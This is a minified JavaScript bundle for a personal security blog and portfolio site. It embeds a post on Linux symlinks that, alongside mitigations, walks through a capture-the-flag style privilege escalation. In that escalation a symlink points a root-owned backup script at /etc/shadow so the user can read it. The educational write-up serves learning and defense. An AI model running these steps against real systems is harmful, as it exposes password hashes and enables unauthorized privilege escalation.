  <script src="script.js"><\/script>
</body>
</html>`,tm=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Exploring Symlinks: Practical Usage and Security Implications</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Exploring Symlinks: Practical Usage and Security Implications</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What Are Symlinks?</h2>
        <p>
          In Linux, symbolic links are essentially shortcuts that point to other files or directories. They allow you to reference a file or directory without duplicating its contents. Symlinks are incredibly useful when you need to access or organize files in multiple locations. However, if used carelessly, they can create security vulnerabilities, particularly when root-owned processes interact with user-created symlinks.
        </p>

        <h3>Hard Links vs. Symbolic Links</h3>
        <ul>
          <li><strong>Hard Links:</strong> Direct references to data on disk. Hard links share the same inode with the original file, meaning they’re identical and can’t link to directories.</li>
          <li><strong>Symbolic Links (Symlinks):</strong> References that point to the path of a target file or directory. Symlinks are separate from the original file’s data, so deleting the target will break the link.</li>
        </ul>

        <h2>Creating and Using Symlinks</h2>
        <p>The basic syntax for creating a symlink is:</p>
        <div class="code-block">
          <code>ln -s [target] [symlink_name]</code>
        </div>
        <p>
          • <strong>[target]:</strong> The file or directory you want to link to.<br>
          • <strong>[symlink_name]:</strong> The name of your symlink.
        </p>

        <h3>Examples</h3>
        <div class="code-block">
          <code>
# Creating a symlink to a file<br>
ln -s /home/user/documents/file.txt /home/user/desktop/file_link.txt
          </code>
        </div>
        <p>This creates <code>file_link.txt</code> on your desktop, which behaves like a shortcut to <code>file.txt</code>.</p>

        <div class="code-block">
          <code>
# Creating a symlink to a directory<br>
ln -s /home/user/projects /home/user/desktop/projects_link
          </code>
        </div>
        <p>Accessing <code>projects_link</code> will take you directly to <code>/home/user/projects</code>.</p>

        <h3>Overwriting an Existing Symlink</h3>
        <div class="code-block">
          <code>ln -sf /new/target/path /path/to/existing_symlink</code>
        </div>
        <p>The <code>-f</code> option forces the update of the symlink’s target.</p>

        <h2>Privilege Escalation Using Symlinks</h2>
        <p>
          During my Hack The Box challenge, I learned how symlinks can be used to escalate privileges when system configurations are insecure. Here’s how this works:
        </p>

        <h3>Scenario: Exploiting a Root-Owned Script</h3>
        <p>
          Imagine a script (<code>backup.sh</code>) owned by root regularly copies files from a directory to a root-owned backup location. If the script is designed to follow any symlinks it encounters, this could give normal users access to root-level files.
        </p>

        <h3>Steps to Exploit</h3>
        <div class="code-block">
          <code>
# Step 1: Remove any existing file at /tmp/important_file<br>
rm -f /tmp/important_file<br><br>
# Step 2: Create a symlink pointing to /etc/shadow<br>
ln -s /etc/shadow /tmp/important_file<br><br>
# Step 3: Wait for the root script to run or run it manually if possible<br>
          </code>
        </div>
        <p>
          If the root script copies <code>/etc/shadow</code> to a location accessible to the user, the user can potentially gain root-level information and escalate privileges.
        </p>

        <h2>Mitigating This Exploit</h2>
        <ul>
          <li><strong>Avoid Following Symlinks in Scripts:</strong> Avoid copying or modifying files without checking for symlinks, especially in root-owned scripts.</li>
          <li><strong>Use the <code>-P</code> Option in <code>cp</code>:</strong> This flag tells <code>cp</code> not to follow symlinks, helping to prevent exploitation.</li>
          <li><strong>Restrict Writable Directories:</strong> Limit permissions on directories where files are written or manipulated by privileged processes.</li>
        </ul>

        <h2>Conclusion</h2>
        <p>
          Symlinks are an incredibly powerful tool for managing files and directories, but they come with inherent risks if not handled carefully. Understanding how symlinks work and the potential security implications is critical for both system administrators and security professionals. Whether you're organizing files or working on penetration testing challenges, symlinks offer both utility and insight into system-level operations.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,rm={firmware_llm_annotator:{title:"Firmware Exploration: LLM as Your Annotator",slug:"firmware_llm_annotator",content:Zh},1001:{title:"CVE-2024–1001",slug:"1001",content:Kh},"0012":{title:"CVE-2024–0012",slug:"0012",content:Gh},40982:{title:"CVE-2022–40982",slug:"40982",content:qh},cow:{title:"CVE-2016–5195",slug:"cow",content:Jh},symlinks:{title:"Symbolic Links (Symlinks) in Linux",slug:"symlinks",content:tm},23397:{title:"CVE-2023–23397",slug:"23397",content:Xh},"0160":{title:"CVE-2014-0160",slug:"0160",content:Qh},11882:{title:"CVE-2017-11882",slug:"11882",content:Yh},robot:{title:"ROBOT (Return of Bleichenbacher’s Oracle Threat) Attack",slug:"robot",content:nm},poodle:{title:"ZOMBIE POODLE and GOLDENDOODLE ATTACKS",slug:"poodle",content:em}};function im(e){try{const t=new DOMParser().parseFromString(e,"text/html"),r=["style","script","link","nav","header","footer",".navbar",".nav-container",".theme-toggle",".footer",".social-links",".social-icons"];t.querySelectorAll(r.join(",")).forEach(s=>s.remove()),t.querySelectorAll("[style]").forEach(s=>s.removeAttribute("style"));const i=t.querySelector("h1");i&&i.remove();const l=[".blog-text","article",".blog-post-content","main"];let o=t.body;for(const s of l){const a=t.querySelector(s);if(a){o=a;break}}return o.querySelectorAll(".container").forEach(s=>{for(;s.firstChild;)s.parentNode.insertBefore(s.firstChild,s);s.remove()}),Array.from(o.querySelectorAll("h2, h3")).forEach((s,a)=>{s.id||(s.id=`section-${a+1}`)}),o.innerHTML||e}catch{return e}}function lm(){const{slug:e}=eh(),n=rm[e],t=to.find(l=>l.slug===e),r=S.useMemo(()=>n?im(n.content):"",[n]),i=()=>document.body.classList.contains("dark")?"dark":"light";return S.useEffect(()=>{const l=document.querySelector(".giscus-container");if(!l)return;l.innerHTML="";const o=document.createElement("script");return o.src="https://giscus.app/client.js",o.async=!0,o.crossOrigin="anonymous",o.setAttribute("data-giscus","true"),o.setAttribute("data-repo","Hem1700/hem1700.github.io"),o.setAttribute("data-repo-id","R_kgDONilgZg"),o.setAttribute("data-category","General"),o.setAttribute("data-category-id","DIC_kwDONilgZs4CzSR2"),o.setAttribute("data-mapping","pathname"),o.setAttribute("data-strict","1"),o.setAttribute("data-reactions-enabled","1"),o.setAttribute("data-emit-metadata","0"),o.setAttribute("data-input-position","top"),o.setAttribute("data-lang","en"),o.setAttribute("data-theme",i()),l.appendChild(o),()=>{l.innerHTML=""}},[e]),S.useEffect(()=>{const l=()=>{var a;const s=document.querySelector("iframe.giscus-frame");s&&((a=s.contentWindow)==null||a.postMessage({giscus:{setConfig:{theme:i()}}},"https://giscus.app"))},o=new MutationObserver(l);return o.observe(document.body,{attributes:!0,attributeFilter:["class"]}),l(),()=>o.disconnect()},[]),n?u.jsxs(u.Fragment,{children:[u.jsx("header",{className:"blog-post-header",children:u.jsxs("div",{className:"container text-center",children:[u.jsx("h1",{className:"blog-post-title",children:n.title}),t&&u.jsxs("p",{className:"blog-post-date",children:[t.date," · ",t.readTime]})]})}),u.jsxs("main",{className:"blog-post-content container",children:[u.jsx("article",{dangerouslySetInnerHTML:{__html:r}}),u.jsx("section",{className:"comments",children:u.jsx("div",{className:"container",children:u.jsx("div",{className:"giscus-container"})})})]})]}):u.jsxs("main",{className:"blog-post-content container",children:[u.jsx("h2",{children:"Post not found"}),u.jsx("p",{children:"Looks like Toby was here. Let’s go back."}),u.jsx(Ue,{to:"/blogs",className:"view-credentials",children:"Back to Blog"})]})}const om=["All","Security Tools","Research","Web","Desktop","Cloud","Automation"];function sm({activeFilter:e,onFilterChange:n}){return u.jsx("div",{className:"filter-chips",children:om.map(t=>u.jsx("button",{className:`chip ${t===e?"active":""}`,type:"button",onClick:()=>n(t),children:t},t))})}function am({items:e}){const[n,t]=S.useState(0);if(!(e!=null&&e.length))return null;const r=e[n],i=()=>t(o=>(o+1)%e.length),l=()=>t(o=>(o-1+e.length)%e.length);return u.jsxs("div",{className:"featured-carousel",children:[u.jsxs("div",{className:"featured-card",children:[u.jsxs("div",{className:"featured-meta",children:[u.jsx("span",{className:"pill",children:"Featured"}),r.tag&&u.jsx("span",{className:"pill",children:r.tag})]}),u.jsx("h3",{children:r.title}),u.jsx("p",{children:r.description}),u.jsx("div",{className:"project-tags",children:(r.tags||[]).map(o=>u.jsx("span",{className:"pill",children:o},o))}),u.jsx("div",{className:"featured-actions",children:u.jsx("a",{href:r.href,target:"_blank",rel:"noreferrer",className:"link-button",children:"View"})})]}),e.length>1&&u.jsxs("div",{className:"featured-controls",children:[u.jsx("button",{type:"button",onClick:l,className:"button ghost",children:"←"}),u.jsx("button",{type:"button",onClick:i,className:"button ghost",children:"→"})]})]})}function um({items:e,showViewAll:n=!1,showHeader:t=!0}){const[r,i]=S.useState("All"),[l,o]=S.useState(1),s=4,a=e.slice(0,2),c=S.useMemo(()=>r==="All"?e:e.filter(v=>{var w;return(w=v.tags)==null?void 0:w.some(k=>k.toLowerCase().includes(r.toLowerCase().split(" ")[0]))}),[r,e]),g=Math.max(1,Math.ceil(c.length/s)),h=c.slice((l-1)*s,l*s),m=v=>{i(v),o(1)};return u.jsx("section",{className:"projects",id:"projects",children:u.jsxs("div",{className:"container",children:[t&&u.jsxs("div",{className:"section-header",children:[u.jsxs("div",{children:[u.jsx("h2",{className:"section-title",children:"Projects"}),u.jsx("p",{className:"section-subtitle",children:'Quarterly Projects Report — "I am Beyoncé, always."'})]}),n&&u.jsx("div",{className:"section-actions",children:u.jsx(Ue,{className:"link-button",to:"/projects",children:"View all projects"})})]}),t&&u.jsx(sm,{activeFilter:r,onFilterChange:m}),t&&u.jsx(am,{items:a}),u.jsx("div",{className:"projects-list",children:h.map(v=>{var w;return u.jsxs("div",{className:"project-row",children:[u.jsxs("div",{className:"project-row-body",children:[u.jsx("a",{href:v.href,target:"_blank",rel:"noreferrer",className:"project-title-link",children:u.jsx("h5",{className:"project-title",children:v.title})}),u.jsx("p",{className:"project-description",children:v.description}),(w=v.tags)!=null&&w.length?u.jsx("div",{className:"project-tags",children:v.tags.map(k=>u.jsx("span",{className:"pill",children:k},k))}):null]}),u.jsx("div",{className:"project-row-cta",children:u.jsx("a",{href:v.href,target:"_blank",rel:"noreferrer",className:"view-credentials",children:"View"})})]},v.title)})}),g>1&&u.jsxs("div",{className:"blog-pagination project-pagination",children:[u.jsx("button",{className:"pill",disabled:l===1,onClick:()=>o(Math.max(1,l-1)),children:"Previous"}),u.jsxs("span",{className:"blog-page-indicator",children:["Page ",l," of ",g]}),u.jsx("button",{className:"pill",disabled:l===g,onClick:()=>o(Math.min(g,l+1)),children:"Next"})]})]})})}function cm(){return u.jsxs(u.Fragment,{children:[u.jsx("header",{className:"blog-welcome-section",children:u.jsxs("div",{className:"container text-center",children:[u.jsx("h1",{children:"Projects"}),u.jsx("p",{className:"blog-subtitle",children:"A focused list of what I’ve shipped and explored."})]})}),u.jsx(um,{items:Bh,showHeader:!1})]})}function dm({issuer:e="Cert"}){var t;const n=((t=e==null?void 0:e[0])==null?void 0:t.toUpperCase())||"C";return u.jsx("div",{className:"cert-badge",children:n})}const fm=["All","Security","Cloud","Networking"];function pm({items:e,showViewAll:n=!1,showHeader:t=!0}){const[r,i]=S.useState("All"),[l,o]=S.useState(1),s=5,a=S.useMemo(()=>r==="All"?e:e.filter(m=>m.domain?m.domain===r:!0),[r,e]),c=Math.max(1,Math.ceil(a.length/s)),g=a.slice((l-1)*s,l*s),h=m=>{i(m),o(1)};return u.jsx("section",{className:"certifications",id:"certs",children:u.jsxs("div",{className:"container",children:[t&&u.jsxs("div",{className:"section-header",children:[u.jsx("div",{children:u.jsx("h2",{children:"CERTIFICATIONS"})}),n&&u.jsx("div",{className:"section-actions",children:u.jsx(Ue,{className:"link-button",to:"/certifications",children:"View all certifications"})})]}),t&&u.jsx("div",{className:"filter-chips",children:fm.map(m=>u.jsx("button",{className:`chip ${m===r?"active":""}`,type:"button",onClick:()=>h(m),children:m},m))}),u.jsx("div",{className:"cert-list",children:g.map(m=>u.jsxs("div",{className:"cert-row",children:[u.jsxs("div",{className:"cert-row-meta",children:[u.jsx("div",{className:"cert-row-badge",children:u.jsx(dm,{issuer:m.issuer})}),u.jsxs("div",{className:"cert-row-tags",children:[u.jsx("span",{className:"pill",children:m.domain}),u.jsx("span",{className:"pill",children:m.issuer})]})]}),u.jsxs("div",{className:"cert-row-body",children:[u.jsx("div",{className:"cert-row-title",children:m.title}),u.jsx("p",{className:"cert-row-details",children:m.details})]}),u.jsx("div",{className:"cert-row-cta",children:u.jsx("a",{href:m.href,className:"view-credentials",target:"_blank",rel:"noreferrer",children:"View"})})]},m.title))}),c>1&&u.jsxs("div",{className:"blog-pagination project-pagination",children:[u.jsx("button",{className:"pill",disabled:l===1,onClick:()=>o(Math.max(1,l-1)),children:"Previous"}),u.jsxs("span",{className:"blog-page-indicator",children:["Page ",l," of ",c]}),u.jsx("button",{className:"pill",disabled:l===c,onClick:()=>o(Math.min(c,l+1)),children:"Next"})]})]})})}function hm(){return u.jsxs(u.Fragment,{children:[u.jsx("header",{className:"blog-welcome-section",children:u.jsxs("div",{className:"container text-center",children:[u.jsx("h1",{children:"Certifications"}),u.jsx("p",{className:"blog-subtitle",children:"Credentials and exams I’ve completed."})]})}),u.jsx(pm,{items:Fh,showHeader:!1})]})}function mm(){const e="hemparekh1596@gmail.com",[n,t]=S.useState(!1),r=()=>{navigator.clipboard&&navigator.clipboard.writeText(e).then(()=>{t(!0),setTimeout(()=>t(!1),1800)}).catch(()=>{})};return u.jsx("section",{className:"contact-strip",id:"contact",children:u.jsxs("div",{className:"container contact-grid",children:[u.jsxs("div",{children:[u.jsx("p",{className:"pill",children:"Let’s talk"}),u.jsx("h2",{children:"Leave a message after the beep (Jim’s prank pending)."}),u.jsx("p",{className:"contact-blurb",children:"Let’s connect to collaborate on security engineering or privacy-focused initiatives."}),n&&u.jsx("p",{className:"contact-blurb",children:"Copied. Threat level: Midnight."})]}),u.jsxs("div",{className:"contact-actions",children:[u.jsx("button",{className:"button primary",onClick:r,type:"button",children:"Copy Email"}),u.jsx("a",{className:"button ghost",href:"https://www.linkedin.com/in/hem-parekh/",target:"_blank",rel:"noreferrer",children:"LinkedIn"}),u.jsx("a",{className:"button ghost",href:"https://github.com/Hem1700",target:"_blank",rel:"noreferrer",children:"GitHub"})]})]})})}function gm(){const[e,n]=S.useState(0);return S.useEffect(()=>{const t=()=>{const{scrollTop:r,scrollHeight:i,clientHeight:l}=document.documentElement,o=i>l?r/(i-l)*100:0;n(Math.min(100,Math.max(0,o)))};return t(),window.addEventListener("scroll",t,{passive:!0}),()=>window.removeEventListener("scroll",t)},[]),u.jsx("div",{className:"scroll-progress",children:u.jsx("div",{className:"scroll-progress__bar",style:{width:`${e}%`}})})}function vm(){const[e,n]=S.useState(!1);return S.useEffect(()=>{const t=()=>n(window.scrollY>400);return window.addEventListener("scroll",t,{passive:!0}),t(),()=>window.removeEventListener("scroll",t)},[]),e?u.jsx("button",{className:"back-to-top",type:"button","aria-label":"Back to top",title:"World’s Best Dundie takes you up.",onClick:()=>window.scrollTo({top:0,behavior:"smooth"}),children:"↑"}):null}function ym(){const[e,n]=S.useState(()=>typeof window>"u"?"light":localStorage.getItem("theme")||"light");return S.useEffect(()=>{const r=document.body;r.classList.remove("light","dark"),r.classList.add(e),localStorage.setItem("theme",e)},[e]),{theme:e,toggleTheme:()=>{n(r=>r==="light"?"dark":"light")}}}function wm(){const{theme:e,toggleTheme:n}=ym();return u.jsx(bh,{children:u.jsxs("div",{className:"app-shell",children:[u.jsx(gm,{}),u.jsx(Ph,{onToggleTheme:n,theme:e}),u.jsx("main",{children:u.jsxs(gh,{children:[u.jsx(Tn,{path:"/",element:u.jsx(ka,{})}),u.jsx(Tn,{path:"/blogs",element:u.jsx($h,{})}),u.jsx(Tn,{path:"/projects",element:u.jsx(cm,{})}),u.jsx(Tn,{path:"/certifications",element:u.jsx(hm,{})}),u.jsx(Tn,{path:"/blog/:slug",element:u.jsx(lm,{})}),u.jsx(Tn,{path:"*",element:u.jsx(ka,{})})]})}),u.jsx(mm,{}),u.jsx(_h,{}),u.jsx(vm,{})]})})}Ac(document.getElementById("root")).render(u.jsx(Oa.StrictMode,{children:u.jsx(wm,{})}));
